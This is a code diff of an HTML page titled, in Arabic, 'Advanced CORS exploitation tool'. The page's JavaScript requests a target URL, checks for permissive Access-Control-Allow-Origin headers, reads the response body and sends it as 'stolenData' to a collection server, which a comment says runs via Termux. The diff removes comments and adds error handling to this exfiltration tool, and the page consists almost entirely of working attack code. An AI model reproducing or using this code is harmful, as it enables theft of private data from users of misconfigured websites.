@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>أداة استغلال CORS المتطورة</title>
     <style>
-        /* تنسيق الصفحة */
         body {
             font-family: Arial, sans-serif;
             background-color: #f4f4f9;
@@ -97,7 +96,6 @@
     </div>
 
     <script>
-        // استخدام async/await لتحسين السرعة والكفاءة
         async function exploitCORS() {
             const targetUrl = document.getElementById('targetUrl').value.trim();
             const httpMethod = document.getElementById('httpMethod').value;
@@ -110,11 +108,9 @@
                 return;
             }
 
-            // تحديث الحالة
             statusElement.textContent = "جاري فحص الثغرة...";
             statusElement.style.color = 'blue';
 
-            // إعدادات الطلب بناءً على نوع الطلب (GET أو POST)
             const fetchOptions = {
                 method: httpMethod,
                 headers: {
@@ -122,21 +118,26 @@
                 }
             };
 
-            // إذا كان الطلب POST، نضيف بيانات JSON في الـ body
             if (httpMethod === 'POST') {
                 fetchOptions.body = JSON.stringify({ key: 'value' });
                 fetchOptions.headers['Content-Type'] = 'application/json';
             }
 
             try {
-                // إرسال الطلب
+                // إرسال الطلب إلى الـ API
                 const response = await fetch(targetUrl, fetchOptions);
+
+                // التحقق من حالة الاستجابة
+                if (!response.ok) {
+                    throw new Error(`استجابة غير صالحة: ${response.statusText}`);
+                }
+
+                // التحقق من رؤوس CORS
                 const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
                 const allowMethods = response.headers.get('Access-Control-Allow-Methods');
                 const allowHeaders = response.headers.get('Access-Control-Allow-Headers');
 
                 if (allowOrigin === '*' || allowOrigin.includes(window.location.origin)) {
-                    // التحقق من CORS Misconfiguration
                     if (allowMethods && allowHeaders) {
                         statusElement.textContent = `تم اكتشاف ثغرة CORS! السماح بالطرق: ${allowMethods}, الرؤوس: ${allowHeaders}`;
                         statusElement.style.color = 'green';
@@ -145,7 +146,6 @@
                         statusElement.style.color = 'orange';
                     }
 
-                    // جلب البيانات المسروقة
                     const data = await response.text();
                     resultElement.style.display = 'block';
                     resultElement.innerHTML = `
@@ -156,13 +156,13 @@
                     // إرسال البيانات المسروقة إلى الخادم عبر Termux
                     await sendStolenData(data);
                 } else {
-                    statusElement.textContent = "لم يتم العثور على ثغرة CORS.";
-                    statusElement.style.color = 'red';
+                    throw new Error("لم يتم العثور على ثغرة CORS في الاستجابة.");
                 }
             } catch (error) {
-                statusElement.textContent = "حدث خطأ أثناء الفحص.";
+                // إدارة الأخطاء بشكل أفضل
+                console.error(error);
+                statusElement.textContent = `حدث خطأ أثناء الفحص: ${error.message}`;
                 statusElement.style.color = 'red';
-                console.error('Error:', error);
             }
         }
 
@@ -176,10 +176,15 @@
                     },
                     body: JSON.stringify({ stolenData: data })
                 });
+
+                if (!response.ok) {
+                    throw new Error('فشل في إرسال البيانات إلى الخادم.');
+                }
+
                 const result = await response.json();
-                console.log("Data sent successfully", result);
+                console.log("تم إرسال البيانات بنجاح:", result);
             } catch (error) {
-                console.error("Error sending stolen data:", error);
+                console.error("حدث خطأ أثناء إرسال البيانات:", error);
             }
         }
     </script>
